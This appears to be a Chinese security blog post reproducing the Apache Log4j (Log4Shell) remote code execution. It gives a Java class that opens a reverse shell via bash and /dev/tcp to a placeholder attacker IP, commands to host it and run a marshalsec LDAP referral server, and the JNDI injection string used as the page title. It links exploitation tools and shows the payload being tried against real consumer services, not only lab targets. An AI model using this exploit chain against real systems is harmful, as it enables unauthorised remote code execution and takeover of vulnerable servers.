@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Apache Log4j 任意代码执行简单复现利用原理分析在文章最后几个知名公众号里去看，分析的很好 开头一张图  根据网上公布的反弹 shell Exp 利用 更换一下 ip 即可 123456789101112131415import java.lang.Runtime;import java.lang.Process;public class Exp &amp;#123;    static &amp;#1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="${jndi:ldap:&#x2F;&#x2F;ip:6666&#x2F;Exp}">
+<meta property="og:url" content="http://example.com/2021/12/11/log4j/index.html">
+<meta property="og:site_name" content="杨树林">
+<meta property="og:description" content="Apache Log4j 任意代码执行简单复现利用原理分析在文章最后几个知名公众号里去看，分析的很好 开头一张图  根据网上公布的反弹 shell Exp 利用 更换一下 ip 即可 123456789101112131415import java.lang.Runtime;import java.lang.Process;public class Exp &amp;#123;    static &amp;#1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639207950/IMG_1457_pmk2e2.jpg">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639205294/Xnip2021-12-11_14-46-44_vvmgih.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639205523/Xnip2021-12-11_14-51-42_qmn4m7.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639205523/Xnip2021-12-11_14-51-51_ycxcup.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639205750/Xnip2021-12-11_14-55-30_xgwmx0.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639206251/Xnip2021-12-11_15-03-42_u7jimd.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639206349/Xnip2021-12-11_15-05-38_de7hpo.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639206468/Xnip2021-12-11_15-07-30_polfii.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639207950/IMG_1456_k5rkus.jpg">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639209239/IMG_1463_xzwxek.jpg">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639209239/IMG_1465_o5gc9r.jpg">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639208516/591639208492_.pic_ewossf.jpg">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639208521/581639208492_.pic_nco7pj.jpg">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639208504/601639208492_.pic_fron97.jpg">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639209238/IMG_1464_vxgfmp.jpg">
+<meta property="article:published_time" content="2021-12-11T10:56:58.000Z">
+<meta property="article:modified_time" content="2022-02-12T12:19:06.524Z">
+<meta property="article:author" content="lin">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://res.cloudinary.com/lin1109/image/upload/v1639207950/IMG_1457_pmk2e2.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+    
+    <!-- title -->
+    <title>${jndi:ldap://ip:6666/Exp}</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/vlog/">vlog</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2021/12/28/vulntarget-b/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2021/12/08/netlogon/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/12/11/log4j/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/12/11/log4j/&text=${jndi:ldap://ip:6666/Exp}"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/12/11/log4j/&title=${jndi:ldap://ip:6666/Exp}"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/12/11/log4j/&is_video=false&description=${jndi:ldap://ip:6666/Exp}"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=${jndi:ldap://ip:6666/Exp}&body=Check out this article: http://example.com/2021/12/11/log4j/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/12/11/log4j/&title=${jndi:ldap://ip:6666/Exp}"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/12/11/log4j/&title=${jndi:ldap://ip:6666/Exp}"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/12/11/log4j/&title=${jndi:ldap://ip:6666/Exp}"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/12/11/log4j/&title=${jndi:ldap://ip:6666/Exp}"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/12/11/log4j/&name=${jndi:ldap://ip:6666/Exp}&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/12/11/log4j/&t=${jndi:ldap://ip:6666/Exp}"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-Log4j-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%88%A9%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">Apache Log4j 任意代码执行简单复现利用</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ${jndi:ldap://ip:6666/Exp}
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-12-11T10:56:58.000Z" itemprop="datePublished">2021-12-11</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Apache-Log4j-任意代码执行简单复现利用"><a href="#Apache-Log4j-任意代码执行简单复现利用" class="headerlink" title="Apache Log4j 任意代码执行简单复现利用"></a>Apache Log4j 任意代码执行简单复现利用</h2><p>原理分析在文章最后几个知名公众号里去看，分析的很好</p>
+<p>开头一张图</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639207950/IMG_1457_pmk2e2.jpg"></p>
+<p>根据网上公布的反弹 shell Exp 利用</p>
+<p>更换一下 ip 即可</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/ip/12000 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>javac 编译一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Exp.class</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639205294/Xnip2021-12-11_14-46-44_vvmgih.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 11000</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639205523/Xnip2021-12-11_14-51-42_qmn4m7.png"></p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639205523/Xnip2021-12-11_14-51-51_ycxcup.png"></p>
+<p>使用工具开启一个 RMI 和 LDAP 服务</p>
+<p>工具地址：<a target="_blank" rel="noopener" href="https://github.com/RandomRobbieBF/marshalsec-jar">https://github.com/RandomRobbieBF/marshalsec-jar</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://ip:11000/#Exp&quot;</span> 6666</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639205750/Xnip2021-12-11_14-55-30_xgwmx0.png"></p>
+<p>nc 监听 12000 端口</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639206251/Xnip2021-12-11_15-03-42_u7jimd.png"></p>
+<p>使用在线环境</p>
+<p><a target="_blank" rel="noopener" href="http://d63bb2586.lab.aqlab.cn/">http://d63bb2586.lab.aqlab.cn/</a></p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639206349/Xnip2021-12-11_15-05-38_de7hpo.png"></p>
+<p>点击登录即可收到反弹的 shell</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639206468/Xnip2021-12-11_15-07-30_polfii.png"></p>
+<p>其他靶场</p>
+<p>雷石安全实验室的靶场：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/4cvooT4tfQhjL7t4GFzYFQ">https://mp.weixin.qq.com/s/4cvooT4tfQhjL7t4GFzYFQ</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln</span><br><span class="line">docker run -it -d -p 8080:8080 --name log4j_vuln_container registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln </span><br><span class="line">docker exec -it log4j_vuln_container /bin/bash</span><br><span class="line">/bin/bash /home/apache-tomcat-8.5.45/bin/startup.sh</span><br></pre></td></tr></table></figure>
+
+
+
+<p>BUGKU：<a target="_blank" rel="noopener" href="https://ctf.bugku.com/challenges/detail/id/340.html">https://ctf.bugku.com/challenges/detail/id/340.html</a></p>
+<p>CTF Show、vulfoucs 等平台都有对应的漏洞 docker 环境</p>
+<p>相关工具</p>
+<p>以下工具来源于网络，后门自测</p>
+<p>burp 插件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">「Log4j2Scan-0.1-SNAPSHOT.jar」链接：https://www.aliyundrive.com/s/tiCPNENwLkC</span><br></pre></td></tr></table></figure>
+
+<p>利用工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">「Log4j_RCE_Tool」链接：https://www.aliyundrive.com/s/JL2DEh73pR2</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">「marshalsec-jar」链接：https://www.aliyundrive.com/s/YGA3xFHndmm</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">「Apache-Log4j-Learning」链接：https://www.aliyundrive.com/s/7S7sD3JgYwf</span><br></pre></td></tr></table></figure>
+
+<p>log4j 被定义为 “核弹级漏洞”，这几天朋友圈、微信群、QQ 群全是 dnslog 图，包括一些大厂如苹果、京东、百度、拼多多等都存在漏洞风险，由于测试过于激烈，导致 dnslog 平台、fofa 平台一度崩溃、这几天更被称为安全圈的 “年会” ，刚才测试了几个站，发现就算 dnslog 有记录，也不一定能反弹 shell，dnslog 不等于任意代码执行。</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639207950/IMG_1456_k5rkus.jpg"></p>
+<p>收集了一些正常姿势</p>
+<p>baidu</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639209239/IMG_1463_xzwxek.jpg"></p>
+<p>apple</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639209239/IMG_1465_o5gc9r.jpg"></p>
+<p>等等。。。。。。</p>
+<p>然后也看到了一些骚姿势</p>
+<p>比如 apple airpods 改名字之后。。。。。</p>
+<p>这个我证实确实有。。。。。</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639208516/591639208492_.pic_ewossf.jpg"></p>
+<p>甚至是 wifi （未测试）</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639208521/581639208492_.pic_nco7pj.jpg"></p>
+<p>车。。。。（没有保时捷，未能测试呜呜呜呜呜呜）</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639208504/601639208492_.pic_fron97.jpg"></p>
+<p>emm，windows。。挺离谱的，不过倒也正常</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639209238/IMG_1464_vxgfmp.jpg"></p>
+<p>还有对着地球喊了一声 ${jndi:ldap:&#x2F;&#x2F;ip:6666&#x2F;Exp}，dnslog 就有记录了</p>
+<p>反正就是万物皆可 ${jndi:ldap:&#x2F;&#x2F;ip:6666&#x2F;Exp}</p>
+<p>相关分析文章：</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/6Ijs3tUsDnGWCKaHtxRTKg">https://mp.weixin.qq.com/s/6Ijs3tUsDnGWCKaHtxRTKg</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/WQedgd3RRg3L7KhBJyFIKw">https://mp.weixin.qq.com/s/WQedgd3RRg3L7KhBJyFIKw</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/p2X1gu-rbiI3FZwteErnkQ">https://mp.weixin.qq.com/s/p2X1gu-rbiI3FZwteErnkQ</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/vlog/">vlog</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-Log4j-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%88%A9%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">Apache Log4j 任意代码执行简单复现利用</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/12/11/log4j/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/12/11/log4j/&text=${jndi:ldap://ip:6666/Exp}"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/12/11/log4j/&title=${jndi:ldap://ip:6666/Exp}"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/12/11/log4j/&is_video=false&description=${jndi:ldap://ip:6666/Exp}"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=${jndi:ldap://ip:6666/Exp}&body=Check out this article: http://example.com/2021/12/11/log4j/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/12/11/log4j/&title=${jndi:ldap://ip:6666/Exp}"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/12/11/log4j/&title=${jndi:ldap://ip:6666/Exp}"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/12/11/log4j/&title=${jndi:ldap://ip:6666/Exp}"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/12/11/log4j/&title=${jndi:ldap://ip:6666/Exp}"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/12/11/log4j/&name=${jndi:ldap://ip:6666/Exp}&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/12/11/log4j/&t=${jndi:ldap://ip:6666/Exp}"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2022
+    lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/vlog/">vlog</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"superSample":2,"width":200,"height":350,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":false,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
